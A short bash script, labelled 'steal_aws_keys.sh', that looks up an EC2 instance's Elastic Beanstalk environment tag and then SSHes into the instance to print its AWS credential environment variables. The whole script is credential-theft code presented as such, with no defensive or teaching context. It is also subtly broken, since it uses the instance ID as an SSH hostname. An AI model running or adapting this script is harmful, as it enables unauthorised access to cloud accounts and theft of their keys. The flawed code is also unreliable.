#!/bin/bash
# Steal AWS keys from environment variables
# Usage: steal_aws_keys.sh <instance_id>

INSTANCE_ID=$1

if [ -z "$INSTANCE_ID" ]; then
    echo "Usage: $0 <instance_id>"
    exit 1
fi

echo "Stealing AWS keys from instance: $INSTANCE_ID"

aws ec2 describe-instances --instance-ids $INSTANCE_ID --query 'Reservations[*].Instances[*].{InstanceId:InstanceId,Environment:Tags[?Key==`aws:elasticbeanstalk:environment-name`].Value|[0]}' --output text | while read -r instance_id environment; do
    echo "Instance ID: $instance_id, Environment: $environment"
    echo "Stealing keys from environment: $environment"
    # Assuming access to the instance, fetch environment variables
    ssh -i mykey.pem ec2-user@$instance_id 'printenv | grep AWS'
done

echo "AWS key theft completed."
